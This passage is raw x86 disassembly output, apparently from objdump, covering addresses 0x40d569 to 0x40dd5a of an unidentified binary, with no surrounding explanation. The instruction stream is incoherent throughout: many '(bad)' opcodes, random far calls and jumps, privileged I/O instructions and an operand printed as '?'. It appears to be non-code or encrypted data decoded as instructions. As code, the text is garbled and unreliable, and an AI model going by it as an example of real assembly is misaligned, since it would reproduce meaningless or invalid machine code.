  40d569:	jne    0x40d50d
  40d56b:	pop    esi
  40d56c:	(bad)  
  40d56d:	int    0xe9
  40d56f:	mov    al,0xda
  40d571:	and    edi,0xb504b85e
  40d577:	add    al,0x67
  40d579:	(bad)  
  40d57a:	jns    0x40d55a
  40d57c:	pusha  
  40d57d:	shr    BYTE PTR [ecx+edx*8-0x75],cl
  40d581:	cmp    eax,0x9ff2820e
  40d586:	pop    ebp
  40d587:	dec    edi
  40d588:	adc    BYTE PTR [edi-0xd],ch
  40d58b:	call   FWORD PTR [eax+0x22e37404]
  40d591:	imul   ah
  40d593:	fistp  QWORD PTR [edi]
  40d595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d596:	mov    dl,0xc7
  40d598:	das    
  40d599:	jmp    0x40d596
  40d59b:	mov    al,BYTE PTR [esi]
  40d59d:	xchg   ecx,eax
  40d59e:	repnz inc ecx
  40d5a0:	pop    edx
  40d5a1:	xchg   esi,eax
  40d5a2:	cmp    DWORD PTR [eax-0x17129466],esi
  40d5a8:	inc    ebx
  40d5a9:	test   DWORD PTR [ecx+eiz*1],eax
  40d5ac:	sbb    DWORD PTR [ebx+0x2b],ebp
  40d5af:	lods   al,BYTE PTR ds:[esi]
  40d5b0:	jb     0x40d5d0
  40d5b2:	jg     0x40d5db
  40d5b4:	pop    eax
  40d5b5:	cmp    BYTE PTR [edi],cl
  40d5b7:	mov    ebx,0x443d268a
  40d5bc:	sbb    DWORD PTR [eax-0x3927a01],0xfd3213fc
  40d5c6:	xchg   BYTE PTR [ebx+0x5a],dl
  40d5c9:	sub    BYTE PTR [edx+0x7e],0x43
  40d5cd:	adc    eax,0xec257aaa
  40d5d2:	loope  0x40d557
  40d5d4:	push   ebp
  40d5d5:	mov    dl,dl
  40d5d7:	in     al,dx
  40d5d8:	inc    ebx
  40d5d9:	stos   DWORD PTR es:[edi],eax
  40d5da:	inc    ebp
  40d5db:	sub    eax,0x2acffd9b
  40d5e0:	stos   DWORD PTR es:[edi],eax
  40d5e1:	aad    0x8c
  40d5e3:	add    dh,BYTE PTR ds:[ebp-0x6117f369]
  40d5ea:	lds    edi,FWORD PTR [ebx]
  40d5ec:	xchg   esi,eax
  40d5ed:	cli    
  40d5ee:	mov    dh,0x3d
  40d5f0:	add    dh,BYTE PTR [ecx]
  40d5f2:	pop    esi
  40d5f3:	mov    dh,0x3b
  40d5f5:	mov    bl,0x39
  40d5f7:	add    eax,0x27b89422
  40d5fc:	adc    edx,DWORD PTR [eax-0x58]
  40d5ff:	dec    ebx
  40d600:	or     eax,0x25812bdd
  40d605:	sbb    DWORD PTR [ecx+edx*8-0x33],ebx
  40d609:	outs   dx,BYTE PTR ds:[esi]
  40d60a:	addr16 test al,0x6f
  40d60d:	mov    esi,0x7a98d999
  40d612:	and    DWORD PTR [esp+edi*1-0x2a],ecx
  40d616:	shl    DWORD PTR ds:0x91f702e2,0x67
  40d61d:	adc    dl,al
  40d61f:	sbb    DWORD PTR [edx-0x1e],esp
  40d622:	push   0xf9066d3e
  40d627:	mov    eax,0x30b6313f
  40d62c:	mov    esp,0x5274f30f
  40d631:	imul   DWORD PTR [edi+0x5abca7b9]
  40d637:	(bad)  
  40d638:	jnp    0x40d67c
  40d63a:	jg     0x40d60a
  40d63c:	pushf  
  40d63d:	jp     0x40d64f
  40d63f:	sub    BYTE PTR [edi],ch
  40d641:	in     eax,0xe0
  40d643:	add    BYTE PTR [ecx+0x49],ch
  40d646:	in     al,dx
  40d647:	rcr    DWORD PTR [ebx+0x7d],0x8c
  40d64b:	xor    ebp,DWORD PTR [ecx-0x7]
  40d64e:	dec    ebp
  40d64f:	aam    0x68
  40d651:	shr    DWORD PTR [esi],1
  40d653:	mov    dl,0x43
  40d655:	mov    dh,0xd4
  40d657:	sbb    DWORD PTR [esi+ebp*1+0xda1c292],eax
  40d65e:	es pop ebp
  40d660:	aam    0x14
  40d662:	lds    edx,FWORD PTR [eax+0x5d329547]
  40d668:	test   BYTE PTR [esi],bl
  40d66a:	out    dx,eax
  40d66b:	or     ecx,DWORD PTR [eax-0x2346fc8e]
  40d671:	out    0xed,eax
  40d673:	cmp    edx,DWORD PTR [edx+0x4f]
  40d676:	enter  0xf009,0x31
  40d67a:	xchg   esp,eax
  40d67b:	dec    eax
  40d67c:	push   0xf895c451
  40d681:	outs   dx,DWORD PTR ds:[esi]
  40d682:	pop    ebp
  40d683:	cdq    
  40d684:	(bad)  
  40d685:	jecxz  0x40d6d9
  40d687:	jle    0x40d673
  40d689:	dec    eax
  40d68a:	cdq    
  40d68b:	pop    ds
  40d68c:	(bad)  
  40d68d:	mov    ebx,0x8723c7c6
  40d692:	stc    
  40d693:	mov    cl,0xa0
  40d695:	sahf   
  40d696:	inc    edx
  40d697:	cs out 0xed,al
  40d69a:	shl    BYTE PTR [edx-0x618a65ca],cl
  40d6a0:	pop    eax
  40d6a1:	mov    eax,ds:0x5dd157d5
  40d6a6:	xrelease mov BYTE PTR [esi],ah
  40d6a9:	push   ecx
  40d6aa:	mov    ebp,0xb832e5be
  40d6af:	mov    bl,0xfb
  40d6b1:	imul   BYTE PTR [ebx-0x36]
  40d6b4:	and    cl,BYTE PTR [ebx]
  40d6b6:	push   ebp
  40d6b7:	jbe    0x40d67f
  40d6b9:	repnz xchg bh,bl
  40d6bc:	int    0x6d
  40d6be:	add    dh,cl
  40d6c0:	pop    ds
  40d6c1:	xor    al,0x9f
  40d6c3:	inc    edi
  40d6c4:	das    
  40d6c5:	fistp  DWORD PTR [esi-0x2d]
  40d6c8:	mov    BYTE PTR [ecx+0x53],ch
  40d6cb:	icebp  
  40d6cc:	lahf   
  40d6cd:	int3   
  40d6ce:	or     dh,BYTE PTR [ecx]
  40d6d0:	mov    ch,0xe3
  40d6d2:	cmp    eax,0x99e6e283
  40d6d7:	mov    ds:0x67c74a6c,al
  40d6dc:	fwait
  40d6dd:	push   eax
  40d6de:	push   edi
  40d6df:	mov    ds:0x83394137,al
  40d6e4:	jne    0x40d688
  40d6e6:	sub    esp,DWORD PTR [ebx+0x6]
  40d6e9:	mov    ebp,0xcd31fec7
  40d6ee:	cli    
  40d6ef:	xchg   esi,eax
  40d6f0:	shl    edi,cl
  40d6f2:	sbb    ch,0x2d
  40d6f5:	data16 ja 0x40d696
  40d6f8:	sub    BYTE PTR [edx+0x6cf90b12],ch
  40d6fe:	sub    ah,cl
  40d700:	int3   
  40d701:	es dec eax
  40d703:	add    eax,DWORD PTR [eax-0x5ab8d317]
  40d709:	fdivrp st(0),st
  40d70b:	xor    eax,0xa1f28cdc
  40d710:	cmp    BYTE PTR [eax-0x48],ah
  40d713:	mov    eax,0xce860f85
  40d718:	jp     0x40d70e
  40d71a:	loop   0x40d746
  40d71c:	add    ebp,DWORD PTR [ebp+0x1040a140]
  40d722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d723:	sar    DWORD PTR [esi-0x39b0dbda],cl
  40d729:	mov    dl,0xd0
  40d72b:	lahf   
  40d72c:	sbb    eax,0xf202c87c
  40d731:	call   0x5a9eeaaf
  40d736:	(bad)  
  40d738:	popa   
  40d739:	sbb    eax,0xc72a0b70
  40d73e:	mov    eax,DWORD PTR [eax+0x3f54839e]
  40d744:	mov    ecx,0x7a96261c
  40d749:	and    al,0x1b
  40d74b:	dec    esp
  40d74c:	std    
  40d74d:	xor    al,0xf4
  40d74f:	int3   
  40d750:	mov    cs,WORD PTR [ebp+0x68]
  40d753:	add    DWORD PTR [edi-0x379ea2ba],esi
  40d759:	or     BYTE PTR [esi+0x1a],ah
  40d75c:	inc    edi
  40d75d:	(bad)  
  40d75f:	push   0x40
  40d761:	(bad)  
  40d762:	popa   
  40d763:	scas   eax,DWORD PTR es:[edi]
  40d764:	inc    eax
  40d765:	jg     0x40d7a5
  40d767:	sub    DWORD PTR [ecx],esp
  40d769:	(bad)  
  40d76a:	mov    ds:0x32d8a52d,eax
  40d76f:	jae    0x40d6fa
  40d771:	stc    
  40d772:	sti    
  40d773:	pop    es
  40d774:	neg    esp
  40d776:	pop    ebp
  40d777:	inc    ebx
  40d778:	call   0x5424:0x6659eacb
  40d77f:	outs   dx,BYTE PTR ds:[esi]
  40d780:	add    DWORD PTR [ecx+0xf],ecx
  40d783:	mov    dh,BYTE PTR [ecx-0x26]
  40d786:	(bad)
  40d78b:	add    eax,ebx
  40d78d:	xchg   ebp,eax
  40d78e:	das    
  40d78f:	je     0x40d7f3
  40d791:	xor    eax,0xeb5c5bc6
  40d796:	(bad)  
  40d797:	pop    edi
  40d798:	pusha  
  40d799:	retf   0x82f
  40d79c:	sub    eax,0x19aa1eee
  40d7a1:	mov    ebp,0x10f466b5
  40d7a6:	inc    edi
  40d7a7:	pop    edi
  40d7a8:	sub    ecx,edi
  40d7aa:	(bad)  
  40d7ab:	(bad)  
  40d7ac:	jnp    0x40d82c
  40d7ae:	das    
  40d7af:	loope  0x40d7c1
  40d7b1:	dec    ebx
  40d7b2:	mov    edx,0x8d767688
  40d7b7:	mov    dh,dl
  40d7b9:	cs mov ebx,0x56fc556f
  40d7bf:	dec    edx
  40d7c0:	mov    ds:0xa7e3f287,eax
  40d7c5:	xchg   ecx,eax
  40d7c6:	out    dx,al
  40d7c7:	sub    eax,0xc89f28f2
  40d7cc:	jno    0x40d7ab
  40d7ce:	int    0xdf
  40d7d0:	sub    BYTE PTR [esp+ebx*4],al
  40d7d3:	aaa    
  40d7d4:	jl     0x40d7d6
  40d7d6:	mov    dl,0xc2
  40d7d8:	pop    edx
  40d7d9:	add    eax,0x7d1843da
  40d7de:	xchg   ebp,eax
  40d7df:	xor    eax,0xac838a35
  40d7e4:	cwde   
  40d7e5:	hlt    
  40d7e6:	and    eax,0x99a73911
  40d7eb:	(bad)  
  40d7ec:	ret    
  40d7ed:	adc    DWORD PTR [ebp-0x14],0xa59e1f8b
  40d7f4:	test   al,0x37
  40d7f6:	outs   dx,DWORD PTR ds:[esi]
  40d7f7:	pcmpgtd mm2,QWORD PTR [ebp-0x30618010]
  40d7fe:	sub    edx,DWORD PTR [edx-0x80]
  40d801:	mov    ch,0x4d
  40d803:	ins    BYTE PTR es:[edi],dx
  40d804:	test   DWORD PTR [eax+0x50],eax
  40d807:	or     esp,eax
  40d809:	jb     0x40d881
  40d80b:	out    0x6d,eax
  40d80d:	ja     0x40d88e
  40d80f:	mov    eax,ds:0x78a709b1
  40d814:	xchg   edi,eax
  40d815:	sti    
  40d816:	(bad)  
  40d817:	fsub   QWORD PTR [ebp+0x2]
  40d81a:	test   DWORD PTR [edx],eax
  40d81c:	iret   
  40d81d:	adc    DWORD PTR [ecx-0x73e2404e],edi
  40d823:	(bad)  
  40d825:	sub    esi,DWORD PTR [ecx+ebp*1]
  40d828:	outs   dx,DWORD PTR ds:[esi]
  40d829:	mov    bh,0x44
  40d82b:	inc    ebp
  40d82c:	pop    eax
  40d82d:	stos   DWORD PTR es:[edi],eax
  40d82e:	mov    WORD PTR [edi],fs
  40d830:	int3   
  40d831:	jmp    0xe7213a45
  40d836:	pop    esi
  40d837:	dec    esp
  40d838:	mov    ch,0x19
  40d83a:	pusha  
  40d83b:	push   ecx
  40d83c:	dec    eax
  40d83d:	out    dx,al
  40d83e:	fwait
  40d83f:	push   edx
  40d840:	data16 mov cl,0x14
  40d843:	xchg   edx,eax
  40d844:	fisub  WORD PTR [ebp-0x2dfddf93]
  40d84a:	pop    ebp
  40d84b:	sar    BYTE PTR [ecx],cl
  40d84d:	add    esp,DWORD PTR [edx]
  40d84f:	lea    edi,[ebp+0x3a525400]
  40d855:	pop    es
  40d856:	je     0x40d875
  40d858:	test   eax,0xb1b83246
  40d85d:	add    eax,0x3fe7b522
  40d862:	xor    eax,0x975ff55a
  40d867:	xchg   edx,eax
  40d868:	or     cl,ch
  40d86a:	push   ecx
  40d86b:	xor    dl,bh
  40d86d:	xor    al,0x68
  40d86f:	and    al,0x20
  40d871:	jecxz  0x40d83e
  40d873:	push   ds
  40d874:	jle    0x40d891
  40d876:	fdivr  DWORD PTR [ebx-0x2d]
  40d879:	mov    bh,0x69
  40d87b:	shr    BYTE PTR [eax-0x24956887],0x14
  40d882:	mov    BYTE PTR ds:0xb5fb1fef,bl
  40d888:	cli    
  40d889:	cld    
  40d88a:	mov    ebx,0xaa1c50c9
  40d88f:	jecxz  0x40d878
  40d891:	pop    esp
  40d892:	mov    ecx,0x36dc8e26
  40d897:	add    esi,DWORD PTR [ecx]
  40d899:	push   ss
  40d89a:	aaa    
  40d89b:	inc    edi
  40d89c:	push   ss
  40d89d:	sbb    BYTE PTR [eax+eiz*2],ah
  40d8a0:	lds    edi,FWORD PTR [edx]
  40d8a2:	pop    esi
  40d8a3:	sub    BYTE PTR [ebx+edi*8-0x423e62a],0x32
  40d8ab:	test   DWORD PTR [esi],edx
  40d8ad:	fsubr  DWORD PTR [ecx-0xaba722e]
  40d8b3:	and    al,0xcf
  40d8b5:	mov    ah,0x5b
  40d8b7:	repz adc BYTE PTR [eax+0x3f1a467d],dl
  40d8be:	adc    al,0x47
  40d8c0:	sbb    BYTE PTR [ebx],ch
  40d8c2:	jge    0x40d930
  40d8c4:	les    ecx,FWORD PTR [ecx-0x4d]
  40d8c7:	iret   
  40d8c8:	push   eax
  40d8c9:	push   cs
  40d8ca:	(bad)  
  40d8cb:	push   ebx
  40d8cc:	xchg   edx,eax
  40d8cd:	rcl    DWORD PTR [ebx+eax*2+0x7efc637b],1
  40d8d4:	out    0x71,al
  40d8d6:	les    ebp,FWORD PTR [ecx-0x409b8b70]
  40d8dc:	aaa    
  40d8dd:	out    0xa3,al
  40d8df:	push   ebp
  40d8e0:	fisub  DWORD PTR [ebp-0x214c52ba]
  40d8e6:	(bad)  
  40d8e7:	or     eax,DWORD PTR [eax+0x47]
  40d8ea:	shl    BYTE PTR [esi],1
  40d8ec:	int    0x6
  40d8ee:	test   BYTE PTR [ebp+edi*2-0x231498b],cl
  40d8f5:	push   es
  40d8f6:	sbb    BYTE PTR [edx+0x44],0x74
  40d8fa:	xchg   BYTE PTR [ebp+0x7a],dl
  40d8fd:	retf   0x7a6a
  40d900:	and    DWORD PTR [eax],0x574c4487
  40d906:	cmp    DWORD PTR [esi],edx
  40d908:	sar    DWORD PTR [ebx],0xd8
  40d90b:	xor    ebx,DWORD PTR [ebp+0x3]
  40d90e:	into   
  40d90f:	push   edx
  40d910:	push   cx
  40d912:	push   edi
  40d913:	aam    0xce
  40d915:	dec    edi
  40d916:	nop
  40d917:	push   ebx
  40d918:	ds mov cl,0x37
  40d91b:	pop    ebx
  40d91c:	xchg   edx,eax
  40d91d:	scas   eax,DWORD PTR es:[edi]
  40d91e:	sbb    esp,DWORD PTR [ebp+0x4eb6e588]
  40d924:	leave  
  40d925:	(bad)  
  40d926:	test   BYTE PTR [ecx-0x6abedaff],0x6b
  40d92d:	loopne 0x40d91c
  40d92f:	sub    esi,DWORD PTR [esi]
  40d931:	xchg   edx,eax
  40d932:	loope  0x40d925
  40d934:	add    ebp,DWORD PTR [esi]
  40d936:	xor    eax,0xe0639a16
  40d93b:	lds    eax,FWORD PTR [edx-0x31b95d74]
  40d941:	add    edi,DWORD PTR [ecx-0x46]
  40d944:	in     eax,0x46
  40d946:	cmp    ah,0x78
  40d949:	mov    al,0xa9
  40d94b:	sbb    DWORD PTR [ebx-0x5590bfe6],ecx
  40d951:	js     0x40d9a4
  40d953:	popf   
  40d954:	lea    ebp,[ecx]
  40d956:	loopne 0x40d935
  40d958:	sbb    dh,ah
  40d95a:	mov    ch,0x8f
  40d95c:	inc    esp
  40d95d:	int    0x98
  40d95f:	and    BYTE PTR [ebp-0x28c32ecd],dh
  40d965:	sub    esp,DWORD PTR [ebp+0x3136fe87]
  40d96b:	mov    edi,0xa69734b1
  40d970:	or     DWORD PTR [ecx+0x14e2f0fb],edi
  40d976:	jb     0x40d9e3
  40d978:	xor    eax,0x401b2eec
  40d97d:	mov    ds:0x3daa863e,al
  40d982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d983:	sub    BYTE PTR [eax+0x16f3b2b8],dl
  40d989:	neg    dl
  40d98b:	xlat   BYTE PTR ds:[ebx]
  40d98c:	lods   al,BYTE PTR ds:[esi]
  40d98d:	loopne 0x40d916
  40d98f:	mov    bh,0xc9
  40d991:	push   ecx
  40d992:	arpl   WORD PTR [esi],sp
  40d994:	dec    edi
  40d995:	mov    dl,0x5e
  40d997:	or     DWORD PTR [edi+ebp*4+0x40],esi
  40d99b:	fidiv  WORD PTR [ebp+0x6effb1eb]
  40d9a1:	jnp    0x40d92d
  40d9a3:	int    0xdf
  40d9a5:	out    0x9f,al
  40d9a7:	ins    BYTE PTR es:[edi],dx
  40d9a8:	jns    0x40d958
  40d9aa:	aaa    
  40d9ab:	cmp    al,0x61
  40d9ad:	jbe    0x40d9b2
  40d9af:	jnp    0x40d944
  40d9b1:	xchg   edx,eax
  40d9b2:	retf   
  40d9b3:	jp     0x40d965
  40d9b5:	xor    al,0xf2
  40d9b7:	xchg   ecx,eax
  40d9b8:	jns    0x40da06
  40d9ba:	test   BYTE PTR [ebp+0x43756767],cl
  40d9c0:	and    BYTE PTR [edx+0x6],bl
  40d9c3:	mov    esi,ebp
  40d9c5:	xor    BYTE PTR [esi+0x16],bh
  40d9c8:	and    BYTE PTR [edi+0x62],0xc6
  40d9cc:	cmp    DWORD PTR [ebx+0x33b67c5e],ebp
  40d9d2:	cmp    DWORD PTR [edx],esp
  40d9d4:	xchg   esp,eax
  40d9d5:	push   edx
  40d9d6:	xchg   ebp,eax
  40d9d7:	pop    ebp
  40d9d8:	jmp    0xb839:0xf2912056
  40d9df:	xor    ah,bh
  40d9e1:	(bad)
  40d9e4:	shl    BYTE PTR [ebp+0x1f6d5dd5],cl
  40d9ea:	push   0xffffffc1
  40d9ec:	push   0xb8fa14a6
  40d9f1:	aam    0x79
  40d9f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9f4:	fwait
  40d9f5:	inc    esi
  40d9f6:	call   0x16c29a52
  40d9fb:	inc    ecx
  40d9fc:	xchg   ebp,eax
  40d9fd:	dec    edx
  40d9fe:	loope  0x40da10
  40da00:	lds    edx,FWORD PTR [ebx+0xf9566fc]
  40da06:	dec    edx
  40da07:	adc    al,0x3b
  40da09:	ja     0x40d9b8
  40da0b:	pop    ecx
  40da0c:	xor    eax,DWORD PTR [edx]
  40da0e:	aas    
  40da0f:	pop    es
  40da10:	arpl   WORD PTR [ebp+0x61],di
  40da13:	sbb    bl,BYTE PTR [edx+0x1d06abb6]
  40da19:	call   0xe3bb336d
  40da1e:	clc    
  40da1f:	inc    ebp
  40da20:	pop    ebx
  40da21:	adc    ecx,DWORD PTR [ecx+0x48251295]
  40da27:	inc    ebp
  40da28:	lahf   
  40da29:	push   0xb91c9509
  40da2e:	outs   dx,DWORD PTR cs:[esi]
  40da30:	dec    edx
  40da31:	(bad)  
  40da32:	push   eax
  40da33:	ds jge 0x40da68
  40da36:	jb     0x40da33
  40da38:	leave  
  40da39:	mov    ds:0xc7d50ce8,al
  40da3f:	inc    ebx
  40da40:	pusha  
  40da41:	and    DWORD PTR [eax-0x2fc3b4ca],ebp
  40da47:	mov    ds,WORD PTR [edx-0x7924102]
  40da4d:	iret   
  40da4e:	(bad)  
  40da4f:	cdq    
  40da50:	pop    edi
  40da51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da52:	out    0x7c,eax
  40da54:	xchg   esi,eax
  40da55:	bound  esp,QWORD PTR [edx]
  40da57:	xor    DWORD PTR ds:0xe3364614,edi
  40da5d:	sbb    ebp,ecx
  40da5f:	cmp    DWORD PTR [edi-0x33],0xffffffec
  40da63:	add    ah,BYTE PTR ds:0x440c6e5d
  40da69:	aaa    
  40da6a:	jge    0x40da9d
  40da6c:	sub    al,0xa
  40da6e:	and    edi,esp
  40da70:	mov    cl,0x48
  40da72:	loop   0x40da71
  40da74:	aam    0x77
  40da76:	cmp    esi,DWORD PTR [edi]
  40da78:	jg     0x40da6b
  40da7a:	mov    BYTE PTR [edi+ebx*4],dh
  40da7d:	out    0xa4,al
  40da7f:	shl    BYTE PTR [esi+0x14cc31f1],1
  40da85:	outs   dx,BYTE PTR ds:[esi]
  40da86:	adc    ecx,DWORD PTR [ebp+0x78]
  40da89:	pop    ecx
  40da8a:	jno    0x40da1c
  40da8c:	dec    eax
  40da8d:	inc    ecx
  40da8e:	adc    edi,DWORD PTR [ebx+0x508e7601]
  40da94:	xchg   edx,eax
  40da95:	dec    ebp
  40da96:	inc    esi
  40da97:	jmp    0x7426:0x8767a81d
  40da9e:	add    BYTE PTR [ebx-0x4e0a271],0xb8
  40daa5:	mov    WORD PTR [edx+0x40d66c37],fs
  40daab:	sub    eax,0xd986f47a
  40dab0:	pop    ds
  40dab1:	pop    ebp
  40dab2:	outs   dx,BYTE PTR ds:[esi]
  40dab3:	dec    eax
  40dab4:	int    0x5b
  40dab6:	xor    edx,DWORD PTR [esi-0x7ff0d029]
  40dabc:	scas   eax,DWORD PTR es:[edi]
  40dabd:	int3   
  40dabe:	push   edi
  40dabf:	test   eax,0xe8f2c8f1
  40dac4:	and    DWORD PTR [edx+0x16f9cda0],ebp
  40daca:	push   esi
  40dacb:	inc    ebp
  40dacc:	retf   0x54e3
  40dacf:	icebp  
  40dad0:	(bad)  
  40dad1:	ror    DWORD PTR [esi],1
  40dad3:	inc    eax
  40dad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dad5:	mov    esp,0x36276d5b
  40dada:	in     eax,0xee
  40dadc:	push   edx
  40dadd:	shr    ecx,1
  40dadf:	jl     0x40da7a
  40dae1:	imul   DWORD PTR [edi+0x5b]
  40dae4:	in     eax,0x13
  40dae6:	fwait
  40dae7:	test   BYTE PTR [ebp+0x4b],cl
  40daea:	test   al,0x99
  40daec:	adc    cl,bl
  40daee:	outs   dx,DWORD PTR ds:[esi]
  40daef:	add    al,0x5b
  40daf1:	inc    esp
  40daf2:	sub    al,0x5e
  40daf4:	in     eax,dx
  40daf5:	imul   ebp,DWORD PTR ds:[ecx-0x2da958f8],0x58af1b5e
  40db00:	dec    ebp
  40db01:	jno    0x40daac
  40db03:	pop    ebx
  40db04:	ss ret 
  40db06:	pusha  
  40db07:	cmp    dl,BYTE PTR [eax+edi*4+0x34]
  40db0b:	cwde   
  40db0c:	push   0x61510b43
  40db11:	dec    eax
  40db12:	cli    
  40db13:	mov    BYTE PTR [ebx],bh
  40db15:	in     eax,0x26
  40db17:	mov    ebp,0x3e006f9b
  40db1c:	mov    WORD PTR [ecx+0xc],fs
  40db1f:	pop    esi
  40db20:	jg     0x40db7c
  40db22:	mov    ebx,0x1d2afccc
  40db27:	pop    es
  40db28:	mov    ch,0xaf
  40db2a:	mov    esp,0x730fdb47
  40db2f:	xchg   ebx,eax
  40db30:	inc    esi
  40db31:	rcl    DWORD PTR [ecx],cl
  40db33:	or     edi,eax
  40db35:	sbb    ebp,DWORD PTR [ecx-0xf0479a]
  40db3b:	scas   al,BYTE PTR es:[edi]
  40db3c:	pop    edi
  40db3d:	cmp    BYTE PTR ss:[edx],ch
  40db40:	dec    eax
  40db41:	sbb    ah,BYTE PTR [ecx-0x55f36927]
  40db47:	mov    dh,0x14
  40db49:	push   0x22fb4c45
  40db4e:	outs   dx,DWORD PTR ds:[esi]
  40db4f:	jnp    0x40db91
  40db51:	cmp    dh,BYTE PTR [esi-0x17f60840]
  40db57:	mov    es,WORD PTR [esi]
  40db59:	jp     0x40db7d
  40db5b:	push   edi
  40db5c:	jb     0x40db3e
  40db5e:	scas   eax,DWORD PTR es:[edi]
  40db5f:	sub    ebp,DWORD PTR [ecx-0x443c8513]
  40db65:	push   esi
  40db66:	imul   ecx,DWORD PTR ds:0xb9f1df4d,0x28
  40db6d:	xor    dh,dl
  40db6f:	mov    ds:0xa5ea9cce,al
  40db74:	mov    edx,esi
  40db76:	mov    ds:0x7a3d5301,al
  40db7b:	push   esp
  40db7c:	xchg   ebx,eax
  40db7d:	xor    edx,DWORD PTR [eax-0x625a53ce]
  40db83:	and    DWORD PTR [ebx-0x1c],edx
  40db86:	inc    edx
  40db87:	in     eax,0x7c
  40db89:	inc    eax
  40db8a:	pusha  
  40db8b:	push   ds
  40db8c:	jecxz  0x40db66
  40db8e:	jecxz  0x40dbd2
  40db90:	fstp   DWORD PTR [eax-0x785ac94]
  40db96:	dec    edi
  40db97:	jns    0x40dbb6
  40db99:	and    BYTE PTR [ebp*8-0x488b2250],al
  40dba0:	jae    0x40db7c
  40dba2:	adc    ebp,DWORD PTR [edi]
  40dba4:	add    esp,edx
  40dba6:	cmp    DWORD PTR ds:0xb611e4e2,ebp
  40dbac:	aad    0x58
  40dbae:	jmp    0xff827e7b
  40dbb3:	(bad)  
  40dbb4:	std    
  40dbb5:	jbe    0x40db47
  40dbb7:	inc    ecx
  40dbb8:	mov    esi,0xc86021f4
  40dbbd:	inc    eax
  40dbbe:	sub    edi,ebp
  40dbc0:	stos   DWORD PTR es:[edi],eax
  40dbc1:	fld    TBYTE PTR [edi]
  40dbc3:	repnz sbb edi,DWORD PTR [ecx+0x67f19e6]
  40dbca:	idiv   DWORD PTR [esi-0x43]
  40dbcd:	mov    bl,0x1e
  40dbcf:	pop    edx
  40dbd0:	xchg   ebp,eax
  40dbd1:	popf   
  40dbd2:	push   ebx
  40dbd3:	xor    esi,DWORD PTR [eax]
  40dbd5:	xor    cl,BYTE PTR [ecx]
  40dbd7:	dec    esp
  40dbd8:	call   0xe4cdb4df
  40dbdd:	jmp    0x66fc0f4e
  40dbe2:	push   0xa8276332
  40dbe7:	ficom  WORD PTR [edi+ecx*8]
  40dbea:	sbb    ah,bl
  40dbec:	mov    DWORD PTR [ebx],edi
  40dbee:	(bad)  
  40dbef:	mov    fs,WORD PTR [eax-0x16cf4c27]
  40dbf5:	bound  ebx,QWORD PTR ds:0xbc659be2
  40dbfb:	dec    ebx
  40dbfc:	pop    ebp
  40dbfd:	pop    ds
  40dbfe:	jns    0x40dc2f
  40dc00:	push   edx
  40dc01:	sub    ch,BYTE PTR [esi*1+0x82b6f86]
  40dc08:	call   0x4fd6:0xb3386b81
  40dc0f:	jmp    0x19a5:0x30589130
  40dc16:	jo     0x40dc52
  40dc18:	cmp    DWORD PTR [ebx+0x23087bd2],ecx
  40dc1e:	fwait
  40dc1f:	and    ebx,ecx
  40dc21:	add    al,0xc
  40dc23:	xchg   ecx,eax
  40dc24:	inc    esi
  40dc25:	test   ebx,ebx
  40dc27:	lea    edi,[ecx+0x1f5039cf]
  40dc2d:	mov    edx,0x25c18472
  40dc32:	es pop ds
  40dc34:	push   0x39
  40dc36:	in     al,0xba
  40dc38:	into   
  40dc39:	(bad)  
  40dc3a:	daa    
  40dc3b:	jno    0x40dbc5
  40dc3d:	cmp    al,0x8a
  40dc3f:	pop    ebx
  40dc40:	daa    
  40dc41:	mov    ds:0x6bfc11d8,al
  40dc46:	jns    0x40dc29
  40dc48:	xchg   esi,eax
  40dc49:	lods   eax,DWORD PTR ds:[esi]
  40dc4a:	idiv   edi
  40dc4c:	or     ebp,DWORD PTR [eax+0x8f14e06]
  40dc52:	dec    edi
  40dc53:	(bad)  
  40dc54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc55:	jns    0x40dc60
  40dc57:	ret    0xef32
  40dc5a:	jg     0x40dcc1
  40dc5c:	ret    0x1683
  40dc5f:	cmp    esp,eax
  40dc61:	sbb    al,0xb5
  40dc63:	popf   
  40dc64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc65:	jp     0x40dbea
  40dc67:	inc    edi
  40dc68:	or     eax,0x4a798605
  40dc6d:	pop    ebp
  40dc6e:	sub    al,0x5b
  40dc70:	ins    BYTE PTR es:[edi],dx
  40dc71:	lock cmc 
  40dc73:	mov    ds,WORD PTR [eax-0x2e]
  40dc76:	out    0x5c,eax
  40dc78:	jnp    0x40dc1e
  40dc7a:	jmp    0x10e8:0xcb2d2f43
  40dc81:	(bad)  
  40dc82:	aaa    
  40dc83:	sbb    bl,BYTE PTR [edi+edx*1-0x3e]
  40dc87:	jo     0x40dccc
  40dc89:	xchg   edx,eax
  40dc8a:	(bad)  
  40dc8b:	outs   dx,DWORD PTR ds:[esi]
  40dc8c:	jle    0x40dc58
  40dc8e:	add    DWORD PTR [edx+0x64],0x5e
  40dc92:	mov    WORD PTR [esi+0x4d],?
  40dc95:	daa    
  40dc96:	sahf   
	...
  40dd13:	add    ah,cl
  40dd15:	(bad)
  40dd1a:	into   
  40dd1b:	imul   DWORD PTR [ecx-0x36a3b1b4]
  40dd21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd22:	adc    al,0xb5
  40dd24:	inc    eax
  40dd25:	mov    eax,DWORD PTR [eax]
  40dd27:	add    BYTE PTR [ebx+0x7],ch
  40dd2a:	add    BYTE PTR [eax],al
  40dd2c:	xor    cl,dh
  40dd2e:	nop
  40dd2f:	mov    bh,0x16
  40dd31:	cdq    
  40dd32:	push   esi
  40dd33:	xor    eax,DWORD PTR [ebp-0x157566b0]
  40dd39:	adc    BYTE PTR [ebp-0x50],al
  40dd3c:	out    0x1e,eax
  40dd3e:	sbb    dh,bh
  40dd40:	test   eax,0x604e2dfc
  40dd45:	bound  esp,QWORD PTR [ecx-0x27]
  40dd48:	dec    edi
  40dd49:	xor    BYTE PTR [eax],bh
  40dd4b:	pop    esi
  40dd4c:	cmp    BYTE PTR [eax-0x24],0xad
  40dd50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd51:	in     eax,0xa4
  40dd53:	call   0x42cd:0x9ba5ab29
  40dd5a:	ror    DWORD PTR [ebx-0x2f],1
